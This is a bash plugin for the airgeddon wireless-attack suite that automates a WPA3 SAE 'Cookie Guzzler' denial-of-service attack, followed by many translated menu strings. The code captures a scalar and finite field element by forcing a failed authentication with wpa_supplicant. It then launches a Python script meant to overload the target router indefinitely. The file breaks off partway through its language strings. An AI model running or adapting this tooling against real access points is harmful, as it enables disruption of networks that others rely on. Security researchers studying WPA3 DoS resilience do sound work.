#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="WPA3 cookie guzzler"
plugin_description="A plugin to perform a WPA3 Cookie Guzzler DoS attack"
plugin_author="OscarAkaElvis"

#Credits for Nuseo1 for his help on researching WPA3 DoS

plugin_enabled=1

plugin_minimum_ag_affected_version="11.61"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

#Custom function. Execute WPA3 cookie guzzler attack
function exec_wpa3_cookie_guzzler_attack() {

	debug_print

	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"wpa3 cookie guzzler attack\"" "${python3} ${scriptfolder}${plugins_dir}wpa3_cookie_guzzler.py ${bssid} ${channel} ${interface} ${language} ${scalar} ${finite_field_element} ${colorize}" "wpa3 cookie guzzler attack" "active"
	wait_for_process "${python3} ${scriptfolder}${plugins_dir}wpa3_cookie_guzzler.py ${bssid} ${channel} ${interface} ${language} ${scalar} ${finite_field_element}" "wpa3 cookie guzzler attack"
}

#Custom function. Validate if the needed plugin python file exists
function python3_wpa3_cookie_guzzler_script_validation() {

	debug_print

	if ! [ -f "${scriptfolder}${plugins_dir}wpa3_cookie_guzzler.py" ]; then
		echo
		language_strings "${language}" "wpa3_cookie_guzzler_3" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	return 0
}

#Custom function. Validate if the system has python3.1+ installed and set python launcher
function python3_wpa3_cookie_guzzler_validation() {

	debug_print

	if ! hash python3 2> /dev/null; then
		if ! hash python 2> /dev/null; then
			echo
			language_strings "${language}" "wpa3_cookie_guzzler_2" "red"
			language_strings "${language}" 115 "read"
			return 1
		else
			python_version=$(python -V 2>&1 | sed 's/.* \([0-9]\).\([0-9]\).*/\1\2/')
			if [ "${python_version}" -lt "31" ]; then
				echo
				language_strings "${language}" "wpa3_cookie_guzzler_2" "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
			python3="python"
		fi
	else
		python_version=$(python3 -V 2>&1 | sed 's/.* \([0-9]\).\([0-9]\).*/\1\2/')
		if [ "${python_version}" -lt "31" ]; then
			echo
			language_strings "${language}" "wpa3_cookie_guzzler_2" "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
		python3="python3"
	fi

	return 0
}

#Custom function. Prepare WPA3 cookie guzzler attack
function wpa3_cookie_guzzler_option() {

	debug_print

	get_aircrack_version

	if ! validate_aircrack_wpa3_version; then
		echo
		language_strings "${language}" 763 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! hash tshark 2> /dev/null; then
		language_strings "${language}" "wpa3_cookie_guzzler_4" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! hash wpa_supplicant 2> /dev/null; then
		language_strings "${language}" "wpa3_cookie_guzzler_5" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA3"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	if ! validate_wpa3_network; then
		return 1
	fi

	if ! validate_network_type "personal"; then
		return 1
	fi

	if ! python3_wpa3_cookie_guzzler_validation; then
		return 1
	fi

	if ! python3_wpa3_cookie_guzzler_script_validation; then
		return 1
	fi

	echo
	ask_yesno "wpa3_cookie_guzzler_6" "no"
	if [ "${yesno}" = "y" ]; then
		wpa3_cookie_guzzler_set_scalar_finite_field_element "scalar"
		wpa3_cookie_guzzler_set_scalar_finite_field_element "finite_field_element"
	else
		if ! select_secondary_interface "secondary_interface"; then
			return 1
		fi

		if ! wpa3_cookie_guzzler_validate_secondary_managed; then
			return 1
		fi

		if [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]]; then
			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi

		echo
		language_strings "${language}" "wpa3_cookie_guzzler_11" "yellow"
		language_strings "${language}" 4 "read"

		if ! wpa3_scalar_finite_field_capture; then
			return 1
		fi
	fi

	echo
	language_strings "${language}" "wpa3_cookie_guzzler_9" "blue"

	echo
	language_strings "${language}" "wpa3_cookie_guzzler_10" "blue"

	echo
	language_strings "${language}" 32 "green"
	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"

	exec_wpa3_cookie_guzzler_attack
}

#Custom function. Ensure secondary interface is in managed mode
function wpa3_cookie_guzzler_validate_secondary_managed() {

	debug_print

	check_interface_mode "${secondary_wifi_interface}"
	if [ "${ifacemode}" = "Managed" ]; then
		return 0
	fi

	echo
	language_strings "${language}" "wpa3_cookie_guzzler_14" "yellow"
	echo

	if managed_option "${secondary_wifi_interface}"; then
		return 0
	fi

	return 1
}

function wpa3_scalar_finite_field_capture() {

	debug_print

	rm -rf "${tmpdir}cookie_guzzler"* > /dev/null 2>&1
	scalar=""
	finite_field_element=""

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing Scalar and Finite Field\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}cookie_guzzler ${interface}" "Capturing Scalar and Finite Field"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}cookie_guzzler ${interface}"
		cookie_guzzler_capture_pid="${global_process_pid}"
		global_process_pid=""
	else
		cookie_guzzler_capture_pid=$!
	fi

	wpa3_cookie_guzzler_set_wpa_supplicant_config

	sleep 2
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g1_bottomright_window} -T \"Forcing Failed Auth\"" "wpa_supplicant -Dnl80211 -i ${secondary_wifi_interface} -c ${tmpdir}cookie_guzzler_wpa_supplicant.conf" "Forcing Failed Auth" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "wpa_supplicant -Dnl80211 -i ${secondary_wifi_interface} -c ${tmpdir}cookie_guzzler_wpa_supplicant.conf"
		cookie_guzzler_wpa_supplicant_pid="${global_process_pid}"
		global_process_pid=""
	else
		cookie_guzzler_wpa_supplicant_pid=$!
	fi

	if wpa3_cookie_guzzler_failed_auth_check; then
		wpa3_cookie_guzzler_kill_windows
		echo
		language_strings "${language}" 162 "yellow"
		echo
		language_strings "${language}" "wpa3_cookie_guzzler_13" "blue"
		return 0
	else
		wpa3_cookie_guzzler_kill_windows
		echo
		language_strings "${language}" "wpa3_cookie_guzzler_12" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi
}

#Custom function. Monitor capture for failed authentication and store SAE data
function wpa3_cookie_guzzler_failed_auth_check() {

	debug_print

	local elapsed_time=0
	local wait_timeout=60
	local scalar_candidate
	local finite_field_candidate

	while [ "${elapsed_time}" -le "${wait_timeout}" ]; do
		if [ -f "${tmpdir}cookie_guzzler-01.cap" ]; then

			while IFS=$'\t' read -r scalar_candidate finite_field_candidate; do
				[[ -z "${scalar_candidate}" ]] && continue
				[[ -z "${finite_field_candidate}" ]] && continue
				scalar_candidate=${scalar_candidate//:/}
				finite_field_candidate=${finite_field_candidate//:/}
				scalar_candidate=${scalar_candidate,,}
				finite_field_candidate=${finite_field_candidate,,}
				if [[ ${#scalar_candidate} -eq 64 ]] && [[ ${#finite_field_candidate} -eq 128 ]]; then
					scalar="${scalar_candidate}"
					finite_field_element="${finite_field_candidate}"
					return 0
				fi
			done < <(tshark -r "${tmpdir}cookie_guzzler-01.cap" -Y "wlan.fc.type_subtype == 11 && wlan.bssid == ${bssid}" -T fields -e wlan.fixed.scalar -e wlan.fixed.finite_field_element 2> /dev/null)
		fi
		sleep 2
		elapsed_time=$((elapsed_time + 2))
	done

	return 1
}

#Custom function. Stop the auxiliary windows used during the capture
function wpa3_cookie_guzzler_kill_windows() {

	debug_print

	if [ -n "${cookie_guzzler_capture_pid}" ]; then
		kill "${cookie_guzzler_capture_pid}" > /dev/null 2>&1
		cookie_guzzler_capture_pid=""
	fi

	if [ -n "${cookie_guzzler_wpa_supplicant_pid}" ]; then
		kill "${cookie_guzzler_wpa_supplicant_pid}" > /dev/null 2>&1
		cookie_guzzler_wpa_supplicant_pid=""
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:Capturing Scalar and Finite Field" > /dev/null 2>&1
		tmux kill-window -t "${session_name}:Forcing Failed Auth" > /dev/null 2>&1
	fi
}

#Custom function. Create wpa_supplicant configuration file
function wpa3_cookie_guzzler_set_wpa_supplicant_config() {

	debug_print

	{
	echo -e "network={"
	echo -e "\tssid=\"${essid}\""
	echo -e "\tpsk=\"$(LC_ALL=C tr -dc 'A-Za-z0-9' < /dev/urandom | head -c $((8 + RANDOM % 5)))\""
	echo -e "\tkey_mgmt=SAE"
	} >> "${tmpdir}cookie_guzzler_wpa_supplicant.conf"

	if [[ -n "${channel}" ]] && [[ "${channel}" -le 14 ]]; then
		{
		echo -e "\tfreq_list=2412 2417 2422 2427 2432 2437 2442 2447 2452 2457 2462 2467 2472 2484"
		} >> "${tmpdir}cookie_guzzler_wpa_supplicant.conf"
	fi

	{
	echo -e "}"
	} >> "${tmpdir}cookie_guzzler_wpa_supplicant.conf"
}

#Custom function. Read and validate the scalar and finite field element vars
function wpa3_cookie_guzzler_set_scalar_finite_field_element() {

	debug_print

	local regexp
	if [ "${1}" = "scalar" ]; then
		regexp="^[0-9a-fA-F]{64}$"

		scalar=""
		while [[ ! ${scalar} =~ ${regexp} ]]; do
			echo
			language_strings "${language}" "wpa3_cookie_guzzler_7" "green"
			read -rp "> " scalar
		done
	elif [ "${1}" = "finite_field_element" ]; then
		regexp="^[0-9a-fA-F]{128}$"

		finite_field_element=""
		while [[ ! ${finite_field_element} =~ ${regexp} ]]; do
			echo
			language_strings "${language}" "wpa3_cookie_guzzler_8" "green"
			read -rp "> " finite_field_element
		done
	fi
}

#Prehook hookable_wpa3_attacks_menu function to modify wpa3 menu options
function wpa3_cookie_guzzler_prehook_hookable_wpa3_attacks_menu() {

	if [ "${arr['ENGLISH',756]}" = "6.  WPA3 Cookie Guzzler attack" ]; then
		plugin_x="wpa3_cookie_guzzler_option"
		plugin_x_under_construction=""
	elif [ "${arr['ENGLISH',757]}" = "7.  WPA3 Cookie Guzzler attack" ]; then
		plugin_y="wpa3_cookie_guzzler_option"
		plugin_y_under_construction=""
	elif [ "${arr['ENGLISH',812]}" = "8.  WPA3 Cookie Guzzler attack" ]; then
		plugin_z="wpa3_cookie_guzzler_option"
		plugin_z_under_construction=""
	fi
}

#Prehook for hookable_for_languages function to modify language strings
#shellcheck disable=SC1111
function wpa3_cookie_guzzler_prehook_hookable_for_languages() {

	if [ "${arr['ENGLISH',756]}" = "6.  WPA3 attack (use a plugin here)" ]; then
		arr["ENGLISH",756]="6.  WPA3 Cookie Guzzler attack"
		arr["SPANISH",756]="6.  Ataque Cookie Guzzler WPA3"
		arr["FRENCH",756]="\${pending_of_translation} 6.  Attaque WPA3 Cookie Guzzler"
		arr["CATALAN",756]="\${pending_of_translation} 6.  Atac WPA3 Cookie Guzzler"
		arr["PORTUGUESE",756]="\${pending_of_translation} 6.  Ataque WPA3 Cookie Guzzler"
		arr["RUSSIAN",756]="\${pending_of_translation} 6.  Атака WPA3 Cookie Guzzler"
		arr["GREEK",756]="\${pending_of_translation} 6.  Επίθεση WPA3 Cookie Guzzler"
		arr["ITALIAN",756]="\${pending_of_translation} 6.  Attacco WPA3 Cookie Guzzler"
		arr["POLISH",756]="\${pending_of_translation} 6.  Atak WPA3 Cookie Guzzler"
		arr["GERMAN",756]="\${pending_of_translation} 6.  WPA3 Cookie Guzzler Angriff"
		arr["TURKISH",756]="\${pending_of_translation} 6.  WPA3 Cookie Guzzler saldırısı"
		arr["ARABIC",756]="\${pending_of_translation} 6.  WPA3 Cookie Guzzler هجوم"
		arr["CHINESE",756]="\${pending_of_translation} 6.  WPA3 Cookie Guzzler 攻击"
	elif [ "${arr['ENGLISH',757]}" = "7.  WPA3 attack (use a plugin here)" ]; then
		arr["ENGLISH",757]="7.  WPA3 Cookie Guzzler attack"
		arr["SPANISH",757]="7.  Ataque Cookie Guzzler WPA3"
		arr["FRENCH",757]="\${pending_of_translation} 7.  Attaque WPA3 Cookie Guzzler"
		arr["CATALAN",757]="\${pending_of_translation} 7.  Atac WPA3 Cookie Guzzler"
		arr["PORTUGUESE",757]="\${pending_of_translation} 7.  Ataque WPA3 Cookie Guzzler"
		arr["RUSSIAN",757]="\${pending_of_translation} 7.  Атака WPA3 Cookie Guzzler"
		arr["GREEK",757]="\${pending_of_translation} 7.  Επίθεση WPA3 Cookie Guzzler"
		arr["ITALIAN",757]="\${pending_of_translation} 7.  Attacco WPA3 Cookie Guzzler"
		arr["POLISH",757]="\${pending_of_translation} 7.  Atak WPA3 Cookie Guzzler"
		arr["GERMAN",757]="\${pending_of_translation} 7.  WPA3 Cookie Guzzler Angriff"
		arr["TURKISH",757]="\${pending_of_translation} 7.  WPA3 Cookie Guzzler saldırısı"
		arr["ARABIC",757]="\${pending_of_translation} 7.  WPA3 Cookie Guzzler هجوم"
		arr["CHINESE",757]="\${pending_of_translation} 7.  WPA3 Cookie Guzzler 攻击"
	elif [ "${arr['ENGLISH',812]}" = "8.  WPA3 attack (use a plugin here)" ]; then
		arr["ENGLISH",812]="8.  WPA3 Cookie Guzzler attack"
		arr["SPANISH",812]="8.  Ataque Cookie Guzzler WPA3"
		arr["FRENCH",812]="\${pending_of_translation} 8.  Attaque WPA3 Cookie Guzzler"
		arr["CATALAN",812]="\${pending_of_translation} 8.  Atac WPA3 Cookie Guzzler"
		arr["PORTUGUESE",812]="\${pending_of_translation} 8.  Ataque WPA3 Cookie Guzzler"
		arr["RUSSIAN",812]="\${pending_of_translation} 8.  Атака WPA3 Cookie Guzzler"
		arr["GREEK",812]="\${pending_of_translation} 8.  Επίθεση WPA3 Cookie Guzzler"
		arr["ITALIAN",812]="\${pending_of_translation} 8.  Attacco WPA3 Cookie Guzzler"
		arr["POLISH",812]="\${pending_of_translation} 8.  Atak WPA3 Cookie Guzzler"
		arr["GERMAN",812]="\${pending_of_translation} 8.  WPA3 Cookie Guzzler Angriff"
		arr["TURKISH",812]="\${pending_of_translation} 8.  WPA3 Cookie Guzzler saldırısı"
		arr["ARABIC",812]="\${pending_of_translation} 8.  WPA3 Cookie Guzzler هجوم"
		arr["CHINESE",812]="\${pending_of_translation} 8.  WPA3 Cookie Guzzler 攻击"
	fi

	arr["ENGLISH","wpa3_cookie_guzzler_1"]="WPA3 Cookie Guzzler attack runs forever aiming to overload the router (DoS)"
	arr["SPANISH","wpa3_cookie_guzzler_1"]="El ataque WPA3 Cookie Guzzler se ejecuta indefinidamente con el objetivo de sobrecargar el router (DoS)"
	arr["FRENCH","wpa3_cookie_guzzler_1"]="\${pending_of_translation} L’attaque WPA3 Cookie Guzzler s’exécute indéfiniment dans le but de surcharger le routeur (DoS)"
	arr["CATALAN","wpa3_cookie_guzzler_1"]="\${pending_of_translation} L’atac WPA3 Cookie Guzzler s’executa indefinidament amb l’objectiu de sobrecarregar el router (DoS)"
	arr["PORTUGUESE","wpa3_cookie_guzzler_1"]="\${pending_of_translation} O ataque WPA3 Cookie Guzzler roda indefinidamente visando sobrecarregar o roteador (DoS)"
	arr["RUSSIAN","wpa3_cookie_guzzler_1"]="\${pending_of_translation} Атака WPA3 Cookie Guzzler работает бесконечно, стремясь перегрузить роутер (DoS)"
	arr["GREEK","wpa3_cookie_guzzler_1"]="\${pending_of_translation} Η επίθεση WPA3 Cookie Guzzler τρέχει συνεχώς με στόχο να υπερφορτώσει τον router (DoS)"
	arr["ITALIAN","wpa3_cookie_guzzler_1"]="\${pending_of_translation} L’attacco WPA3 Cookie Guzzler gira indefinitamente con l’obiettivo di sovraccaricare il router (DoS)"
	arr["POLISH","wpa3_cookie_guzzler_1"]="\${pending_of_translation} Atak WPA3 Cookie Guzzler działa bez końca, mając na celu przeciążenie routera (DoS)"
	arr["GERMAN","wpa3_cookie_guzzler_1"]="\${pending_of_translation} Der WPA3 Cookie Guzzler Angriff läuft unendlich weiter, um den Router zu überlasten (DoS)"
	arr["TURKISH","wpa3_cookie_guzzler_1"]="\${pending_of_translation} WPA3 Cookie Guzzler saldırısı yönlendiriciyi aşırı yüklemek amacıyla sürekli çalışır (DoS)"
	arr["ARABIC","wpa3_cookie_guzzler_1"]="\${pending_of_translation} (DoS) الراوتر لإغراق هدفه بشكل مستمر يعمل WPA3 Cookie Guzzler هجوم"
	arr["CHINESE","wpa3_cookie_guzzler_1"]="\${pending_of_translation} WPA3 Cookie Guzzler 攻击会持续运行以尝试让路由器过载。 (即DoS)"
	wpa3_hints+=("wpa3_cookie_guzzler_1")

	arr["ENGLISH","wpa3_cookie_guzzler_2"]="This attack requires to have python3.1+ installed on your system"
	arr["SPANISH","wpa3_cookie_guzzler_2"]="Este ataque requiere tener python3.1+ instalado en el sistema"
	arr["FRENCH","wpa3_cookie_guzzler_2"]="Cette attaque a besoin de python3.1+ installé sur le système"
	arr["CATALAN","wpa3_cookie_guzzler_2"]="Aquest atac requereix tenir python3.1+ instal·lat al sistema"
	arr["PORTUGUESE","wpa3_cookie_guzzler_2"]="Este ataque necessita do python3.1+ instalado no sistema"
	arr["RUSSIAN","wpa3_cookie_guzzler_2"]="Для этой атаки необходимо, чтобы в системе был установлен python3.1+"
	arr["GREEK","wpa3_cookie_guzzler_2"]="Αυτή η επίθεση απαιτεί την εγκατάσταση python3.1+ στο σύστημά σας"
	arr["ITALIAN","wpa3_cookie_guzzler_2"]="Questo attacco richiede che python3.1+ sia installato nel sistema"
	arr["POLISH","wpa3_cookie_guzzler_2"]="Ten atak wymaga zainstalowania w systemie python3.1+"
	arr["GERMAN","wpa3_cookie_guzzler_2"]="Für diesen Angriff muss python3.1+ auf dem System installiert sein"
	arr["TURKISH","wpa3_cookie_guzzler_2"]="Bu saldırı için sisteminizde, python3.1+'ün kurulu olmasını gereklidir"
	arr["ARABIC","wpa3_cookie_guzzler_2"]="على النظام python3.1+ يتطلب هذا الهجوم تثبيت"
	arr["CHINESE","wpa3_cookie_guzzler_2"]="此攻击需要在您的系统上安装 python3.1+"

	arr["ENGLISH","wpa3_cookie_guzzler_3"]="The python3 script required as part of this plugin to run this attack is missing. Please make sure that the file \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" exists and that it is in the plugins dir next to the \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\" file"
	arr["SPANISH","wpa3_cookie_guzzler_3"]="El script de python3 requerido como parte de este plugin para ejecutar este ataque no se encuentra. Por favor, asegúrate de que existe el fichero \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" y que está en la carpeta de plugins junto al fichero \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\""
	arr["FRENCH","wpa3_cookie_guzzler_3"]="Le script de python3 requis dans cet plugin pour exécuter cette attaque est manquant. Assurez-vous que le fichier \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" existe et qu'il se trouve dans le dossier plugins à côté du fichier \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\""
	arr["CATALAN","wpa3_cookie_guzzler_3"]="El script de python3 requerit com a part d'aquest plugin per executar aquest atac no es troba. Assegureu-vos que existeix el fitxer \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" i que està a la carpeta de plugins al costat del fitxer \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\""
	arr["PORTUGUESE","wpa3_cookie_guzzler_3"]="O arquivo python para executar este ataque está ausente. Verifique se o arquivo \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" existe e se está na pasta de plugins com o arquivo \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\""
	arr["RUSSIAN","wpa3_cookie_guzzler_3"]="Скрипт, необходимый этому плагину для запуска этой атаки, отсутствует. Убедитесь, что файл \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" существует и находится в папке для плагинов рядом с файлом \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\"."
	arr["GREEK","wpa3_cookie_guzzler_3"]="Το python3 script που απαιτείται ως μέρος αυτής της προσθήκης για την εκτέλεση αυτής της επίθεσης λείπει. Βεβαιωθείτε ότι το αρχείο \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" υπάρχει και ότι βρίσκεται στον φάκελο plugins δίπλα στο αρχείο \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\""
	arr["ITALIAN","wpa3_cookie_guzzler_3"]="Lo script python3 richiesto come parte di questo plugin per eseguire questo attacco è assente. Assicurati che il file \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" esista e che sia nella cartella dei plugin assieme al file \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\""
	arr["POLISH","wpa3_cookie_guzzler_3"]="Do uruchomienia tego ataku brakuje skryptu python3 wymaganego jako część pluginu. Upewnij się, że plik \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" istnieje i znajduje się w folderze pluginów obok pliku \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\""
	arr["GERMAN","wpa3_cookie_guzzler_3"]="Das python3-Skript, das als Teil dieses Plugins erforderlich ist, um diesen Angriff auszuführen, fehlt. Bitte stellen Sie sicher, dass die Datei \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" vorhanden ist und dass sie sich im Plugin-Ordner neben der Datei \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\" befindet"
	arr["TURKISH","wpa3_cookie_guzzler_3"]="Bu saldırıyı çalıştırmak için bu eklentinin bir parçası olarak gereken python3 komutu dosyası eksik. Lütfen, eklentiler klasöründe \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\" dosyasının yanında, \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" dosyasının da var olduğundan emin olun"
	arr["ARABIC","wpa3_cookie_guzzler_3"]="\"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\" موجود وأنه موجود في مجلد المكونات الإضافية بجوار الملف \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" المطلوب كجزء من هذا البرنامج المساعد لتشغيل هذا الهجوم مفقود. يرجى التأكد من أن الملف pyhton3 سكربت"
	arr["CHINESE","wpa3_cookie_guzzler_3"]="作为此插件的一部分运行此攻击所需的 python3 脚本丢失。请确保文件 \"\${normal_color}wpa3_cookie_guzzler.py\${red_color}\" 存在，并且位于 \"\${normal_color}wpa3_cookie_guzzler.sh\${red_color}\" 旁边的插件目录中 文件"

	arr["ENGLISH","wpa3_cookie_guzzler_4"]="To carry out this attack it is necessary to have \${normal_color}tshark\${red_color} installed and you do not have it at this moment. Please install it and try again"
	arr["SPANISH","wpa3_cookie_guzzler_4"]="Para llevar a cabo este ataque es necesario tener instalado \${normal_color}tshark\${red_color} y tú no lo tienes en este momento. Por favor, instálalo y vuelve a intentarlo"
	arr["FRENCH","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Pour mener cette attaque, il est nécessaire d’avoir \${normal_color}tshark\${red_color} installé et tu ne l’as pas pour le moment. Merci de l’installer et de réessayer"
	arr["CATALAN","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Per dur a terme aquest atac cal tenir \${normal_color}tshark\${red_color} instal·lat i ara mateix no el tens. Si us plau, instal·la’l i torna-ho a provar"
	arr["PORTUGUESE","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Para realizar este ataque é necessário ter o \${normal_color}tshark\${red_color} instalado e tu não o tens neste momento. Por favor, instala-o e tenta novamente"
	arr["RUSSIAN","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Для выполнения этой атаки необходимо, чтобы \${normal_color}tshark\${red_color} был установлен, а в данный момент он у тебя отсутствует. Пожалуйста, установи его и попробуй снова"
	arr["GREEK","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Για να πραγματοποιήσεις αυτή την επίθεση είναι απαραίτητο να έχεις εγκατεστημένο το \${normal_color}tshark\${red_color} και αυτή τη στιγμή δεν το έχεις. Παρακαλώ εγκατέστησέ το και δοκίμασε ξανά"
	arr["ITALIAN","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Per eseguire questo attacco è necessario avere \${normal_color}tshark\${red_color} installato e al momento tu non lo hai. Per favore, installalo e riprova"
	arr["POLISH","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Aby przeprowadzić ten atak, konieczne jest posiadanie zainstalowanego \${normal_color}tshark\${red_color}, a w tej chwili go nie masz. Zainstaluj go i spróbuj ponownie"
	arr["GERMAN","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Um diesen Angriff durchzuführen, muss \${normal_color}tshark\${red_color} installiert sein und du hast es im Moment nicht. Bitte installiere es und versuche es erneut"
	arr["TURKISH","wpa3_cookie_guzzler_4"]="\${pending_of_translation} Bu saldırıyı gerçekleştirmek için \${normal_color}tshark\${red_color} kurulu olmalıdır ve şu anda sende yok. Lütfen yükle ve tekrar dene"
	arr["ARABIC","wpa3_cookie_guzzler_4"]="\${pending_of_translation} \${normal_color}tshark\${red_color} مثبتاً وأنت لا تملكه حالياً. من أجل تنفيذ هذا الهجوم يجب أن يكون"
	arr["CHINESE","wpa3_cookie_guzzler_4"]="\${pending_of_translation} 要执行此攻击，需要安装 \${normal_color}tshark\${red_color}，而你目前尚未安装。请安装它并再次尝试"

	arr["ENGLISH","wpa3_cookie_guzzler_5"]="To carry out this attack it is necessary to have \${normal_color}wpa_supplicant\${red_color} installed and you do not have it at this moment. Please install it and try again"
	arr["SPANISH","wpa3_cookie_guzzler_5"]="Para llevar a cabo este ataque es necesario tener instalado \${normal_color}wpa_supplicant\${red_color} y tú no lo tienes en este momento. Por favor, instálalo y vuelve a intentarlo"
	arr["FRENCH","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Pour mener cette attaque, il est nécessaire d’avoir \${normal_color}wpa_supplicant\${red_color} installé et tu ne l’as pas pour le moment. Merci de l’installer et de réessayer"
	arr["CATALAN","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Per dur a terme aquest atac cal tenir \${normal_color}wpa_supplicant\${red_color} instal·lat i ara mateix no el tens. Si us plau, instal·la’l i torna-ho a provar"
	arr["PORTUGUESE","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Para realizar este ataque é necessário ter o \${normal_color}wpa_supplicant\${red_color} instalado e tu não o tens neste momento. Por favor, instala-o e tenta novamente"
	arr["RUSSIAN","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Для выполнения этой атаки необходимо, чтобы \${normal_color}wpa_supplicant\${red_color} был установлен, а в данный момент он у тебя отсутствует. Пожалуйста, установи его и попробуй снова"
	arr["GREEK","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Για να πραγματοποιήσεις αυτή την επίθεση είναι απαραίτητο να έχεις εγκατεστημένο το \${normal_color}wpa_supplicant\${red_color} και αυτή τη στιγμή δεν το έχεις. Παρακαλώ εγκατέστησέ το και δοκίμασε ξανά"
	arr["ITALIAN","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Per eseguire questo attacco è necessario avere \${normal_color}wpa_supplicant\${red_color} installato e al momento tu non lo hai. Per favore, installalo e riprova"
	arr["POLISH","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Aby przeprowadzić ten atak, konieczne jest posiadanie zainstalowanego \${normal_color}wpa_supplicant\${red_color}, a w tej chwili go nie masz. Zainstaluj go i spróbuj ponownie"
	arr["GERMAN","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Um diesen Angriff durchzuführen, muss \${normal_color}wpa_supplicant\${red_color} installiert sein und du hast es im Moment nicht. Bitte installiere es und versuche es erneut"
	arr["TURKISH","wpa3_cookie_guzzler_5"]="\${pending_of_translation} Bu saldırıyı gerçekleştirmek için \${normal_color}wpa_supplicant\${red_color} kurulu olmalıdır ve şu anda sende yok. Lütfen yükle ve tekrar dene"
	arr["ARABIC","wpa3_cookie_guzzler_5"]="\${pending_of_translation} \${normal_color}wpa_supplicant\${red_color} مثبتاً وأنت لا تملكه حالياً. من أجل تنفيذ هذا الهجوم يجب أن يكون"
	arr["CHINESE","wpa3_cookie_guzzler_5"]="\${pending_of_translation} 要执行此攻击，需要安装 \${normal_color}wpa_supplicant\${red_color}，而你目前尚未安装。请安装它并再次尝试"

	arr["ENGLISH","wpa3_cookie_guzzler_6"]="\${blue_color}To carry out this attack, it is necessary to have certain data from a WPA3 SAE handshake captured from a failed authentication (Scalar and Finite Field Element). If you already have this data, you can enter it manually. If not, it will be captured and two wireless adapters will be required for this. \${green_color}Do you already have this data and want to enter it manually? \${normal_color}\${visual_choice}"
